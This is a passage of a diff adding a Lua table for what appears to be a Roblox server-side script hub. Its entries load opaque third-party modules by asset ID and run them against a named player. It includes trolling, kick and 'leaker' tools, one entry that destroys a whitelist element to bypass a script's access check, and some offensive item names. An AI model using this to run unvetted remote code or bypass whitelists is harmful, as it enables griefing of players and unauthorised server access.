+			Name = "Mr Bye Bye",
+			Function = function(Username: string) import(15584489461)(Username) end
+		},
+		{
+			Name = "Mr Ware",
+			Function = function(Username: string) import(17314754161)(Username) end
+		},
+		{
+			Name = "Mr Ware V2",
+			Function = function(Username: string) import(17314771756)(Username) end
+		},
+		{
+			Name = "Murderer",
+			Function = function(Username: string) import(3709746847).load(Username) end
+		},
+		{
+			Name = "Musterd Gas",
+			Function = function(Username: string) import(2989312214).load(Username) end
+		},
+		{
+			Name = "NG3",
+			Function = function(Username: string) import(5407178653).c3(Username) end
+		},
+		{
+			Name = "Nebula Staff",
+			Function = function(Username: string) import(5152312822).load(Username) end
+		},
+		{
+			Name = "Nectula",
+			Function = function(Username: string) import(3224070083).load(Username) end
+		},
+		{
+			Name = "NelfHelm Boss",
+			Function = function(Username: string) import(4769128965).load(Username) end
+		},
+		{
+			Name = "Neptunian V",
+			Function = function(Username: string) import(14217435560)(Username) end
+		},
+		{
+			Name = "Neptunian V Edit",
+			Function = function(Username: string) import(14217382860)(Username) end
+		},
+		{
+			Name = "Neptunian Gun Knife",
+			Function = function(Username: string) import(14174923555)(Username) end
+		},
+		{
+			Name = "Neurotic",
+			Function = function(Username: string) import(17314908377)(Username) end
+		},
+		{
+			Name = "No Head Man",
+			Function = function(Username: string) import(5161627296).GOD(Username, "hack") end
+		},
+		{
+			Name = "Noob Knife",
+			Function = function(Username: string) import(4678565946):Fire(Username) end
+		},
+		{
+			Name = "Noob Staff",
+			Function = function(Username: string) import(4931685212).load(Username) end
+		},
+		{
+			Name = "Noob Stand",
+			Function = function(Username: string) import(4902600443)("MTW", Username) end
+		},
+		{
+			Name = "Noobcider",
+			Function = function(Username: string) import(4721712660).vi(Username) end
+		},
+		{
+			Name = "Normal Stand",
+			Function = function(Username: string) import(4902600443)("KQ", Username) end
+		},
+		{
+			Name = "Nuclear Minigun",
+			Function = function(Username: string) import(5176504023).load(Username, "hack") end
+		},
+		{
+			Name = "Nuclear Toxic Hulk",
+			Function = function(Username: string) import(4844357782).load(Username) end
+		},
+		{
+			Name = "OP Entity",
+			Function = function(Username: string) import(4484551798).load(Username) end
+		},
+		{
+			Name = "Omega Chara",
+			Function = function(Username: string) import(5300018825).load(Username) end
+		},
+		{
+			Name = "Omega Gaster",
+			Function = function(Username: string) import(5299793703).load(Username) end
+		},
+		{
+			Name = "Omega Sans",
+			Function = function(Username: string) import(5292863529).load(Username) end
+		},
+		{
+			Name = "Oof Sans",
+			Function = function(Username: string) import(4930245801).Sans(Username) end
+		},
+		{
+			Name = "OofNos",
+			Function = function(Username: string) import(5221007407).oofth(Username) end
+		},
+		{
+			Name = "PART",
+			Function = function(Username: string) import(5408268209).c3(Username) end
+		},
+		{
+			Name = "Peculiarity",
+			Function = function(Username: string) import(4764820430):Table_MSG(Username) end
+		},
+		{
+			Name = "Pharaoh",
+			Function = function(Username: string) import(14745403709)(Username) end
+		},
+		{
+			Name = "Piggy",
+			Function = function(Username: string) import(5162050572).eliza(Username) end
+		},
+		{
+			Name = "Pink Guns",
+			Function = function(Username: string) import(17314690633)(Username) end
+		},
+		{
+			Name = "PipBoy",
+			Function = function(Username: string) import(4939065623).load(Username) end
+		},
+		{
+			Name = "Pipe",
+			Function = function(Username: string) import(4560063191).load(Username) end
+		},
+		{
+			Name = "Player Size Gui",
+			Function = function(Username: string) import(5194254117).load(Username) end
+		},
+		{
+			Name = "Poison Gods Blade",
+			Function = function(Username: string) import(5185282393).load(Username, "hack") end
+		},
+		{
+			Name = "Portal Gun",
+			Function = function(Username: string) import(4942134331).load(Username) end
+		},
+		{
+			Name = "Powerfull Eye",
+			Function = function(Username: string) import(5234402758).load(Username) end
+		},
+		{
+			Name = "Prism Code",
+			Function = function(Username: string) import(14175897423)(Username) end
+		},
+		{
+			Name = "Project 44033514",
+			Function = function(Username: string) import(5150855227).load(Username) end
+		},
+		{
+			Name = "Pulse",
+			Function = function(Username: string) import(5018304703)(Username) end
+		},
+		{
+			Name = "Pumpkin Overseer",
+			Function = function(Username: string) import(4702210473).load(Username) end
+		},
+		{
+			Name = "Purple Bog Monster",
+			Function = function(Username: string) import(5176704597).load(Username, "hack") end
+		},
+		{
+			Name = "Purple Guy",
+			Function = function(Username: string) import(5303528309).G(Username) end
+		},
+		{
+			Name = "RLL",
+			Function = function(Username: string) import(5018042393):Fire(Username) end
+		},
+		{
+			Name = "Ragdoll Pan",
+			Function = function(Username: string) import(2946000013):Fire(Username, "hack") end
+		},
+		{
+			Name = "Rainbow Goner",
+			Function = function(Username: string) import(4949010161).G(Username) end
+		},
+		{
+			Name = "Rainbow Stand",
+			Function = function(Username: string) import(4930502743).load(Username) end
+		},
+		{
+			Name = "Ravenger",
+			Function = function(Username: string) import(14173517048)(Username) end
+		},
+		{
+			Name = "Ravenger V2",
+			Function = function(Username: string) import(6099373575).load(Username) end
+		},
+		{
+			Name = "Reality Orb",
+			Function = function(Username: string) import(4780399515).load(Username) end
+		},
+		{
+			Name = "Red Mr Bye Bye",
+			Function = function(Username: string) import(4871023391).load(Username, "loaf") end
+		},
+		{
+			Name = "Red Neptunian V",
+			Function = function(Username: string) import(14217403657)(Username) end
+		},
+		{
+			Name = "Red Scythe",
+			Function = function(Username: string) import(3543603059).load(Username) end
+		},
+		{
+			Name = "Ruby Golem",
+			Function = function(Username: string) import(5014302712):Fire(Username) end
+		},
+		{
+			Name = "Ruin EX",
+			Function = function(Username: string) import(14175887100)(Username) end
+		},
+		{
+			Name = "Ruin Erratum",
+			Function = function(Username: string) import(6085232514).load(Username) end
+		},
+		{
+			Name = "Ruin IX",
+			Function = function(Username: string) import(6223727749).load(Username) end
+		},
+		{
+			Name = "Ruin LX",
+			Function = function(Username: string) import(4721721691).lx(Username) end
+		},
+		{
+			Name = "Ruler Of the Universe",
+			Function = function(Username: string) import(4967832773).load(Username) end
+		},
+		{
+			Name = "S Thomas",
+			Function = function(Username: string) import(5014354119):Fire(Username) end
+		},
+		{
+			Name = "SCP 096",
+			Function = function(Username: string) import(5061767478).load(Username) end
+		},
+		{
+			Name = "SCP 106",
+			Function = function(Username: string) import(5065079644):Fire(Username) end
+		},
+		{
+			Name = "SGRS",
+			Function = function(Username: string) import(4521367095).load(Username) end
+		},
+		{
+			Name = "SS Detector",
+			Function = function(Username: string) import(5486428805).Detect(Username) end
+		},
+		{
+			Name = "Sadique / Sadist",
+			Function = function(Username: string) import(14649807453)(Username) end
+		},
+		{
+			Name = "Saneeees",
+			Function = function(Username: string) import(4176847784).load(Username) end
+		},
+		{
+			Name = "Sans Gaster",
+			Function = function(Username: string) import(3628802124).load(Username) end
+		},
+		{
+			Name = "Sans Last Breath Another Edit",
+			Function = function(Username: string) import(4507584604).load(Username) end
+		},
+		{
+			Name = "Satanic Samurai",
+			Function = function(Username: string) import(4735130128).hal(Username) end
+		},
+		{
+			Name = "School Shooter",
+			Function = function(Username: string) import(2826823504):Run(Username,"i baked you a pie") end
+		},
+		{
+			Name = "School Shooter Remake",
+			Function = function(Username: string) import(3548505226):Fire(Username,"i baked you a pie") end
+		},
+		{
+			Name = "Scissor Zombie",
+			Function = function(Username: string) import(5195833016).load(Username, "test") end
+		},
+		{
+			Name = "Scythe",
+			Function = function(Username: string) import(5176829184).load(Username, "hack") end
+		},
+		{
+			Name = "Server Admin",
+			Function = function(Username: string) import(4665394711).load(Username) end
+		},
+		{
+			Name = "Shackluster's Knife",
+			Function = function(Username: string) import(4702233499).load(Username) end
+		},
+		{
+			Name = "Shield Fiend",
+			Function = function(Username: string) import(4703411081).load(Username) end
+		},
+		{
+			Name = "Shini-G4-MI",
+			Function = function(Username: string) import(4610405562).load(Username) end
+		},
+		{
+			Name = "Shrike",
+			Function = function(Username: string) import(17314857686)(Username) end
+		},
+		{
+			Name = "Sin 3.5",
+			Function = function(Username: string) import(2787132106):Run(Username, "hack") end
+		},
+		{
+			Name = "Sin Dragon",
+			Function = function(Username: string) import(14136474118)(Username) end
+		},
+		{
+			Name = "Sin V2",
+			Function = function(Username: string) import(4710057607).load(Username) end
+		},
+		{
+			Name = "Skid Switcher V2",
+			Function = function(Username: string) import(5382391946).skids2(Username) end
+		},
+		{
+			Name = "Skuller",
+			Function = function(Username: string) import(5405863585).G(Username) end
+		},
+		{
+			Name = "Slapping Fish",
+			Function = function(Username: string) import(5180702303).load(Username) end
+		},
+		{
+			Name = "Snow Golem",
+			Function = function(Username: string) import(4697837332).load(Username) end
+		},
+		{
+			Name = "Snow Machine",
+			Function = function(Username: string) import(4570458887).load(Username) end
+		},
+		{
+			Name = "Solaris",
+			Function = function(Username: string) import(2946060158):Fire(Username, "hack") end
+		},
+		{
+			Name = "Spell Caster",
+			Function = function(Username: string) import(4878971408).load(Username) end
+		},
+		{
+			Name = "Spiderbot",
+			Function = function(Username: string) import(4666386879).load(Username) end
+		},
+		{
+			Name = "Spiderman",
+			Function = function(Username: string) import(5010081614):Fire(Username) end
+		},
+		{
+			Name = "Spongebob Bus",
+			Function = function(Username: string) import(5206315724).load(Username) end
+		},
+		{
+			Name = "Squat Man",
+			Function = function(Username: string) import(6049369369).load(Username) end
+		},
+		{
+			Name = "Starlight",
+			Function = function(Username: string) import(4874790622).load(Username) end
+		},
+		{
+			Name = "Steve Stand",
+			Function = function(Username: string) import(4902600443)("STV", Username) end
+		},
+		{
+			Name = "Studio",
+			Function = function(Username: string) import(4698656280).load(Username) end
+		},
+		{
+			Name = "Suicide Injection",
+			Function = function(Username: string) import(4942136324).load(Username) end
+		},
+		{
+			Name = "Sun God",
+			Function = function(Username: string) import(5185178205).load(Username, "hack") end
+		},
+		{
+			Name = "Super MSG",
+			Function = function(Username: string) import(5339730995).owo(Username) end;
+		},
+		{
+			Name = "Supernova",
+			Function = function(Username: string) import(5407130919).c3(Username) end
+		},
+		{
+			Name = "Switcher",
+			Function = function(Username: string) import(4666430249).cancerv3(Username) end
+		},
+		{
+			Name = "Switcher V4",
+			Function = function(Username: string) import(4639995976).v4(Username) end
+		},
+		{
+			Name = "Syrian Soldier",
+			Function = function(Username: string) import(4967315171).load(Username, "test") end
+		},
+		{
+			Name = "TB Flamethrower",
+			Function = function(Username: string) import(4483948796).load(Username) end
+		},
+		{
+			Name = "Matteo Flamethrower",
+			Function = function(Username: string) import(17314811551)(Username) end
+		},
+		{
+			Name = "TV",
+			Function = function(Username: string) import(5408234869).c3(Username) end
+		},
+		{
+			Name = "Tall Man",
+			Function = function(Username: string) import(5760006539).load(Username) end
+		},
+		{
+			Name = "Tank",
+			Function = function(Username: string) import(5068511197).insert(Username) end
+		},
+		{
+			Name = "Tatrionical Fataliser",
+			Function = function(Username: string) import(4702362667).load(Username) end
+		},
+		{
+			Name = "Tea",
+			Function = function(Username: string) import(3543575474).load(Username) end
+		},
+		{
+			Name = "Techno Fairy",
+			Function = function(Username: string) import(4872735633).load(Username) end
+		},
+		{
+			Name = "Telemons's Hammer",
+			Function = function(Username: string) import(4942331079).load(Username) end
+		},
+		{
+			Name = "Terraria Sword",
+			Function = function(Username: string) import(5185317856).load(Username) end
+		},
+		{
+			Name = "Tesseract",
+			Function = function(Username: string) import(4611972434).load(Username) end
+		},
+		{
+			Name = "Thanos Glove",
+			Function = function(Username: string) import(7714457940).load(Username) end
+		},
+		{
+			Name = "The Amulet",
+			Function = function(Username: string) import(5813871571).load(Username) end
+		},
+		{
+			Name = "The Ancient Voodoo Child",
+			Function = function(Username: string) import(6243450493).load(Username) end
+		},
+		{
+			Name = "The Hand",
+			Function = function(Username: string) import(3095760045):Fire(Username) end
+		},
+		{
+			Name = "The Holy Vaccum",
+			Function = function(Username: string) import(4932480712).load(Username) end
+		},
+		{
+			Name = "The Hotline",
+			Function = function(Username: string) import(5813879549).load(Username) end
+		},
+		{
+			Name = "The Murderer",
+			Function = function(Username: string) import(5122252940)(Username) end
+		},
+		{
+			Name = "Thomas The Tank Engine",
+			Function = function(Username: string) import(4702393505).load(Username) end
+		},
+		{
+			Name = "Thug Skeleton",
+			Function = function(Username: string) import(5199565192).load(Username) end
+		},
+		{
+			Name = "Toxi",
+			Function = function(Username: string) import(4766340057).ww(Username) end
+		},
+		{
+			Name = "Turbolizer?",
+			Function = function(Username: string) import(6042884042).load(Username) end
+		},
+		{
+			Name = "Turret Car",
+			Function = function(Username: string) import(5185235553).load(Username) end
+		},
+		{
+			Name = "UFO",
+			Function = function(Username: string) import(5408177599).c3(Username) end
+		},
+		{
+			Name = "Ubergod",
+			Function = function(Username: string) import(4666103936).load(Username) end
+		},
+		{
+			Name = "Ultimate Guest",
+			Function = function(Username: string) import(4952074297).load(Username) end
+		},
+		{
+			Name = "Ultra Ali",
+			Function = function(Username: string) import(3287961196):Fireplace(Username) end
+		},
+		{
+			Name = "Ultra Sans",
+			Function = function(Username: string) import(5191195848).eliza(Username) end
+		},
+		{
+			Name = "Umbra Mercenary",
+			Function = function(Username: string) import(4766332788).vv(Username) end
+		},
+		{
+			Name = "Unknow Magic",
+			Function = function(Username: string) import(4721880357):Fire(Username) end
+		},
+		{
+			Name = "VRON",
+			Function = function(Username: string) import(5408250642).c3(Username) end
+		},
+		{
+			Name = "Van (Target Name)",
+			Function = function(Username: string) import(7219625364).Van(Username) end
+		},
+		{
+			Name = "Vereus",
+			Function = function(Username: string) import(4875169740).load(Username) end
+		},
+		{
+			Name = "Viankos",
+			Function = function(Username: string) import(6123029966).vian(Username) end
+		},
+		{
+			Name = "Video Powers",
+			Function = function(Username: string) import(4702362667).load(Username) end
+		},
+		{
+			Name = "Void",
+			Function = function(Username: string) import(4470446746).load(Username) end
+		},
+		{
+			Name = "Void Boss",
+			Function = function(Username: string) import(4769881811).load(Username) end
+		},
+		{
+			Name = "Void Boss V3",
+			Function = function(Username: string) import(4175593306).Void(Username) end
+		},
+		{
+			Name = "Void Eye",
+			Function = function(Username: string) import(4769099074).load(Username) end
+		},
+		{
+			Name = "Void Prince",
+			Function = function(Username: string) import(4771194490):void(Username) end
+		},
+		{
+			Name = "Vortex Gaunglets",
+			Function = function(Username: string) import(5030632363).load(Username) end
+		},
+		{
+			Name = "WDY Form",
+			Function = function(Username: string) import(5150834064).load(Username) end
+		},
+		{
+			Name = "Wanderer",
+			Function = function(Username: string) import(5234431005).load(Username) end
+		},
+		{
+			Name = "Warden",
+			Function = function(Username: string) import(4698484171).load(Username) end
+		},
+		{
+			Name = "What Another One V2.5",
+			Function = function(Username: string) import(2598638616).coolify(Username) end
+		},
+		{
+			Name = "What Another One V2",
+			Function = function(Username: string) import(15584619631)(Username) end
+		},
+		{
+			Name = "What Another One V1",
+			Function = function(Username: string) import(15584610704)(Username) end
+		},
+		{
+			Name = "Will Of Justice",
+			Function = function(Username: string) import(5138330292).load(Username) end
+		},
+		{
+			Name = "Winter Conjurer",
+			Function = function(Username: string) import(4702823533).load(Username) end
+		},
+		{
+			Name = "Wyvern",
+			Function = function(Username: string) import(4661961003).load(Username) end
+		},
+		{
+			Name = "Xester",
+			Function = function(Username: string) import(14175124863)(Username) end
+		},
+		{
+			Name = "Xester V2",
+			Function = function(Username: string) import(6099241563).load(Username) end
+		},
+		{
+			Name = "Yellow Sword",
+			Function = function(Username: string) import(5166648286).load(Username, "test") end
+		},
+		{
+			Name = "Zalgo",
+			Function = function(Username: string) import(5225108665).Dark(Username) end
+		},
+		{
+			Name = "Zamazu",
+			Function = function(Username: string) import(4697880637).load(Username) end
+		},
+		{
+			Name = "Zen Master",
+			Function = function(Username: string) import(5072179438).eliza(Username) end
+		},
+		{
+			Name = "Zenith BR-70",
+			Function = function(Username: string) import(4590297182).load(Username) end
+		},
+		{
+			Name = "Zephir",
+			Function = function(Username: string) import(6099248386).load(Username) end
+		},
+		{
+			Name = "Zubus Grab Knife",
+			Function = function(Username: string) import(4528405939).load(Username) end
+		},
+		{
+			Name = "Zythian",
+			Function = function(Username: string) import(4666351790).load(Username) end
+		},
+	},
+
+	Abusives = {
+		--[[{
+			Name = "",
+			Function = function(Username: string) (Username) end
+		},
+		{
+			Name = "",
+			Function = function(Username: string) (Username) end
+		},
+		{
+			Name = "",
+			Function = function(Username: string) (Username) end
+		},
+		{
+			Name = "",
+			Function = function(Username: string) (Username) end
+		},
+		{
+			Name = "",
+			Function = function(Username: string) (Username) end
+		},
+		{
+			Name = "",
+			Function = function(Username: string) (Username) end
+		},
+		{
+			Name = "",
+			Function = function(Username: string) (Username) end
+		},
+		{
+			Name = "",
+			Function = function(Username: string) (Username) end
+		},]]
+	},
+
+	Beta = {
+		--[[{
+			Name = "",
+			Function = function(Username: string) (Username) end
+		},
+		{
+			Name = "",
+			Function = function(Username: string) (Username) end
+		},
+		{
+			Name = "",
+			Function = function(Username: string) (Username) end
+		},
+		{
+			Name = "",
+			Function = function(Username: string) (Username) end
+		},
+		{
+			Name = "",
+			Function = function(Username: string) (Username) end
+		},
+		{
+			Name = "",
+			Function = function(Username: string) (Username) end
+		},
+		{
+			Name = "",
+			Function = function(Username: string) (Username) end
+		},
+		{
+			Name = "",
+			Function = function(Username: string) (Username) end
+		},]]
+	},
+
+	Gears = {
+		{
+			Name = "Gear Force V4",
+			Function = function(Username: string) import(17670495828).force(Username) end
+		},
+		{
+			Name = "Gear Force V2",
+			Function = function(Username: string) import(17411184008).periastron(Username) end
+		},
+		{
+			Name = "Spawn Turret Tool",
+			Function = function(Username: string) import(18777807067)(Username) end
+		},
+		{
+			Name = "Magic Tools",
+			Function = function(Username: string) import(18654257444).RAroblox(Username) end
+		},
+		{
+			Name = "Combat Tool",
+			Function = function(Username: string) import(15627085040).RAroblox(Username) end
+		},
+		{
+			Name = "Sword Tools",
+			Function = function(Username: string) import(18608026480).RAroblox(Username) end
+		},
+		{
+			Name = "RoBio Tools",
+			Function = function(Username: string) import(17561838142).robio(Username) end
+		},
+		{
+			Name = "Minecraft Mobs Spawner",
+			Function = function(Username: string) import(6339079111).mobspawner(Username) end
+		},
+		{
+			Name = "Periastrons",
+			Function = function(Username: string) import(4207280012).load(Username) end
+		},
+		{
+			Name = "Stamper",
+			Function = function(Username: string) import(7137201642)(Username) end
+		},
+		{
+			Name = "Volcanic's Guns",
+			Function = function(Username: string) import(4741518800).Guns(Username) end
+		},
+		{
+			Name = "Baseball Bat V5",
+			Function = function(Username: string) import(4559977647).load(Username) end
+		},
+		{
+			Name = "Death Note",
+			Function = function(Username: string) import(14934726909)(Username) end
+		},
+		{
+			Name = "Holy Wrench",
+			Function = function(Username: string) import(14185868475)(Username) end
+		},
+		{
+			Name = "Holy Hand Grenade V2",
+			Function = function(Username: string) import(8100059698).hulio(Username) end
+		},
+		{
+			Name = "Holy Hand Grenade V1",
+			Function = function(Username: string) import(14185660819)(Username) end
+		},
+		{
+			Name = "Mystic Tools",
+			Function = function(Username: string) import(11371945115).thisbacon(Username) end
+		},
+		{
+			Name = "Airstrike Tools",
+			Function = function(Username: string) import(11670894308).Strafe(Username) end
+		},
+		{
+			Name = "Gravity Hammer",
+			Function = function(Username: string) import(12012115295).load(Username) end
+		},
+		{
+			Name = "Draw 3D",
+			Function = function(Username: string) import(13569096739):Fire(Username,"Draw3D") end
+		},
+		{
+			Name = "Constraint Tools",
+			Function = function(Username: string) import(7518778955).ConstraintTools(Username) end
+		},
+		{
+			Name = "Mega Tool Pack",
+			Function = function(Username: string) import(6331037750)(Username) end
+		},
+		{
+			Name = "Lighting Cannon Tools",
+			Function = function(Username: string) import(6866634166).LcTools(Username) end
+		},
+		{
+			Name = "Rocket Launcher",
+			Function = function(Username: string) import(5367543029):Fire(Username) end
+		},
+		{
+			Name = "Grenade Launcher",
+			Function = function(Username: string) import(10750345558)(Username) end
+		},
+		{
+			Name = "Bat",
+			Function = function(Username: string) import(5089563717).bat(Username) end
+		},
+		{
+			Name = "Throwables",
+			Function = function(Username: string) import(6897672864).load(Username) end
+		},
+		{
+			Name = "Gears 1",
+			Function = function(Username: string) import(10427186558).Owner(Username) end
+		},
+		{
+			Name = "Gears 2",
+			Function = function(Username: string) import(10020427617).ItemAsylum(Username, "ItemAsylum") end
+		},
+		{
+			Name = "Noob Bat",
+			Function = function(Username: string) import(14135472687)(Username) end
+		},
+		{
+			Name = "Super Hungry Mcnoobington",
+			Function = function(Username: string) import(14175916722)(Username) end
+		},
+		{
+			Name = "Tool Gun",
+			Function = function(Username: string) import(14108404712).mingebag(Username) end
+		},
+		{
+			Name = "Oilsauce Remote",
+			Function = function(Username: string) import(14175027633)(Username) end
+		},
+		{
+			Name = "Random Items 1",
+			Function = function(Username: string) import(10559638407).RandomStuff(Username) end 
+		},
+
+		{
+			Name = "Random Items 2",
+			Function = function(Username: string) import(13235808560).epic(Username,"epic") end 
+		},
+
+		{
+			Name = "Random Items 3",
+			Function = function(Username: string) import(9951078969).item(Username) end 
+		},
+
+		{
+			Name = "Random Items 4",
+			Function = function(Username: string) import(12205246069).DW16(Username) end 
+		},
+
+		{
+			Name = "Random Items 5",
+			Function = function(Username: string) import(12220453601).epic(Username,"epic") end 
+		},
+
+		{
+			Name = "Random Items 6",
+			Function = function(Username: string) import(6795333966).enableWeapons(Username) end 
+		},
+
+		{
+			Name = "Random Items 7",
+			Function = function(Username: string) import(6653228796).ToolPack(Username, "loadtools") end 
+		},
+
+		{
+			Name = "Random Items 8",
+			Function = function(Username: string) import(6440220291).tools(Username) end 
+		},
+
+		{
+			Name = "Random Items 9",
+			Function = function(Username: string) import(6727030812).Fun(Username, "Fun") end 
+		},
+
+		{
+			Name = "Random Items 10",
+			Function = function(Username: string) import(8708691885):myfirstscriptthatcankilllol(Username) end 
+		},
+
+		{
+			Name = "Random Items 11",
+			Function = function(Username: string) import(8196198575):myfirstscriptthatcankilllol(Username) end 
+		},
+
+		{
+			Name = "Random Items 12",
+			Function = function(Username: string) import(8867296078):myfirstscriptthatcankilllol(Username) end 
+		},
+
+		{
+			Name = "Random Items 13",
+			Function = function(Username: string) import(8953816776):myfirstscriptthatcankilllol(Username) end 
+		},
+
+		{
+			Name = "Random Items 14",
+			Function = function(Username: string) import(9547789710):myfirstscriptthatcankilllol(Username) end 
+		},
+
+		{
+			Name = "Random Items 15",
+			Function = function(Username: string) import(6331037750)(Username) end 
+		},
+
+		{
+			Name = "Random Items 16",
+			Function = function(Username: string) import(5962219408).toolpack(Username) end 
+		},
+
+		{
+			Name = "Random Items 17",
+			Function = function(Username: string) import(14588963760).load(Username) end 
+		},
+
+		{
+			Name = "Random Items 18",
+			Function = function(Username: string) import(6543347275).death(Username) end 
+		},
+
+		{
+			Name = "Random Items 19",
+			Function = function(Username: string) import(6283496735).LLTP(Username) end 
+		},
+		{ 
+			Name = "Random Items 20",
+			Function = function(Username: string) import(6426631985).memes(Username) end 
+		},
+		{ 
+			Name = "100+ Tools",
+			Function = function(Username: string) import(4888483885).ok(Username) end 
+		},
+		{ 
+			Name = "Fat's Toolpack V3",
+			Function = function(Username: string) import(5944298027).FatToolsV3(Username) end 
+		},
+		{ 
+			Name = "Fesh Tools",
+			Function = function(Username: string) import(6206825735):FeshPowers(Username) end 
+		},
+		{ 
+			Name = "Kick Tool",
+			Function = function(Username: string) import(4979799641).kicktool(Username) end 
+		},
+		{ 
+			Name = "Kostik's Toolpack",
+			Function = function(Username: string) import(5358645479).load(Username) end 
+		},
+		{ 
+			Name = "Mini Toolpack",
+			Function = function(Username: string) import(4785400138).aWeSomEtOOls(Username) end 
+		},
+		{ 
+			Name = "Tools From Scripts",
+			Function = function(Username: string) import(6182987785).all(Username) end 
+		},
+		{ 
+			Name = "Xander's Toolpack",
+			Function = function(Username: string) import(5888706621).eliza(Username, "eliza") end 
+		},
+		{ 
+			Name = "Xander's Toolpack Edit",
+			Function = function(Username: string) import(5942400706).no(Username, "no") end 
+		},
+		{ 
+			Name = "Zero Tools",
+			Function = function(Username: string) import(6211426765)(Username) end 
+		},
+		{ 
+			Name = "Zero Tools V2",
+			Function = function(Username: string) import(6318891158)(Username) end 
+		},
+		{ 
+			Name = "Lex's Tools",
+			Function = function(Username: string) import(15776487598)(Username) end 
+		},
+		{ 
+			Name = "Random Items 21",
+			Function = function(Username: string) import(9644532145).meme(Username) end 
+		},
+		{ 
+			Name = "Random Items 22",
+			Function = function(Username: string) import(10051684510).tool(Username,"M") end 
+		},
+		{ 
+			Name = "Random Items 23",
+			Function = function(Username: string) import(13995327574).jonnysito(Username) end 
+		},
+		{ 
+			Name = "Carbon Engine",
+			Function = function(Username: string) import(15980234542)(Username) end 
+		},
+		{ 
+			Name = "Alpha Engine",
+			Function = function(Username: string) import(18807228518)(Username) end 
+		},
+		{
+			Name = "Sealio V2.1 Guns",
+			Function = function(Username: string) import(17701474907)(Username) end
+		},
+		{
+			Name = "Sealio V2 Guns",
+			Function = function(Username: string) import(4882848368)(Username,"BEANMANBEANMAN") end
+		},
+		{
+			Name = "Sealio V1 Guns",
+			Function = function(Username: string) import(14068914753)(Username) end
+		},
+		{
+			Name = "Rare Tool Pack 2",
+			Function = function(Username: string) import(7125793570).no(Username, "no") end
+		},
+		{
+			Name = "ANOTHER TOOLPACK!",
+			Function = function(Username: string) import(11413899620).load(Username) end
+		},
+		{
+			Name = "Old Toolpack",
+			Function = function(Username: string) import(10216347838).load(Username) end
+		},
+		{
+			Name = "Random Tools v2",
+			Function = function(Username: string) import(11308206793).load(Username) end
+		},
+		{
+			Name = "Random tools 1",
+			Function = function(Username: string) import(10027645647).load(Username) end
+		},
+		{
+			Name = "Random tools 2",
+			Function = function(Username: string) import(7262511872).pooperbrian(Username) end
+		},
+		{
+			Name = "Random tools 3",
+			Function = function(Username: string) import(9429265828).CatToolsUwUOwOUwUOwO_no_balls_huh(Username) end
+		},
+		{
+			Name = "Tool Gun",
+			Function = function(Username: string) import(7356751292).gmod(Username) end
+		},
+		{
+			Name = "Tool's Pack V1",
+			Function = function(Username: string) import(9430201328)(Username) end
+		},
+		{
+			Name = "ZerX's tools",
+			Function = function(Username: string) import(10456431522)(Username) end
+		},
+		{
+			Name = "teleport tool",
+			Function = function(Username: string) import(11093578290).Get(Username, "gab_teleport") end
+		},
+		{
+			Name = "whiplash tool",
+			Function = function(Username: string) import(11093578290).Get(Username, "Whiplash") end
+		},
+		{
+			Name = "wpnxe tools REAL",
+			Function = function(Username: string) import(9971661842):wpnxe(Username) end
+		},
+	},
+
+	Hubs = {
+		{
+			Name = "Fragment Gui",
+			Function = function(Username: string)
+				import(6834582297).fragment(Username, false)
+			end
+		},
+		{
+			Name = "Bodyguard Gui",
+			Function = function(Username: string)
+				import(11172873454).RMIA(Username)
+			end
+		},
+		{
+			Name = "Mid's Hub V3",
+			Function = function(Username: string) 
+				import(16279397863).load(Username);
+				task.defer(function()
+					Players[Username].PlayerGui.something.whitelist:Destroy()
+					Players[Username].PlayerGui.something.athing.Visible = true;
+				end)
+			end
+		},
+		{
+			Name = "Poop Tools V2",
+			Function = function(Username: string) import(16052382566).PoopToolsV2(Username) end
+		},
+		{
+			Name = "Nexus Hub",
+			Function = function(Username: string) import(15987829426)(Username) end
+		},
+		{
+			Name = "Builder X Hub",
+			Function = function(Username: string) import(14619035700).BX(Username) end
+		},
+		{
+			Name = "Hoarder Gui",
+			Function = function(Username: string) import(5028947792).Lmao(Username) end
+		},
+		{
+			Name = "Ultimate Trolling Gui Epix",
+			Function = function(Username: string) import(5109930473).Boss(Username) end
+		},
+		{
+			Name = "Jade Loader Hub V2",
+			Function = function(Username: string) import(12898696957)(Username) end
+		},
+		{
+			Name = "Vpusta NPC Hub",
+			Function = function(Username: string) import(13682455765).RAroblox(Username) end
+		},
+		{
+			Name = "Earthy Hub",
+			Function = function(Username: string) import(6289482937):Fire(Username) end
+		},
+		{
+			Name = "Project Scripted V2",
+			Function = function(Username: string) import(6274987259).v2(Username) end
+		},
+		{
+			Name = "RC7 2021",
+			Function = function(Username: string) import(6234685766)(Username) end
+		},
+		{
+			Name = "Ultimate Van Gui",
+			Function = function(Username: string) import(0x31c316ccc)(Username) end
+		},
+		{
+			Name = "Immortal's Gui",
+			Function = function(Username: string) import(6733698616):Immortal(Username) end
+		},
+		{
+			Name = "Earthy's Hub V2",
+			Function = function(Username: string) import(5282751219):Fire(Username) end
+		},
+		{
+			Name = "Code Hub",
+			Function = function(Username: string) import(4781273884).CODE(Username) end
+		},
+		{
+			Name = "Desclusion Hub",
+			Function = function(Username: string) import(8066591400)(Username) end
+		},
+		{
+			Name = "Tragically Underpowered Sugma",
+			Function = function(Username: string) import(11191215077):tus(Players[Username]) end
+		},
+		{
+			Name = "Anime Hub V2.5",
+			Function = function(Username: string) import(13875044663)["AnimeHubV2.5"](Username) end
+		},
+		{
+			Name = "Adiontware",
+			Function = function(Username: string) import(6661367406).Adiontware(Username) end
+		},
+		{
+			Name = "Franks Hub",
+			Function = function(Username: string) import(5504009971):FranksHub("Frank", Username) end
+		},
+		{
+			Name = "Franks Hub 2",
+			Function = function(Username: string) import(5522806722):FranksHub("Frank",Username) end
+		},
+		{
+			Name = "Rainbow Hub",
+			Function = function(Username: string) import(5818052069):RainbowHub("Rainbow", Username) end
+		},
+		{
+			Name = "Script Hub V3",
+			Function = function(Username: string) import(5320879116).ScriptHubV3(Username) end
+		},
+		{
+			Name = "Spring Hub V3",
+			Function = function(Username: string) import(5687081949).SpringHub(Username) end
+		},
+		{
+			Name = "Leaker X",
+			Function = function(Username: string) import(5637767133).LeakerX(Username) end
+		},
+		{
+			Name = "Megumin Hub",
+			Function = function(Username: string) import(6665978670).Loser(Username) end
+		},
+		{
+			Name = "Glitch Hub V2",
+			Function = function(Username: string) 	import(5313494627).Leak(Username) end
+		},
+		{
+			Name = "Project Scripted Edit",
+			Function = function(Username: string) 	import(6725297744):Scripted(Username) end
+		},
+		{
+			Name = "Jojo's Bizzare Gui",
+			Function = function(Username: string) import(7782559495).jojo(Username) end
+		},
+		{
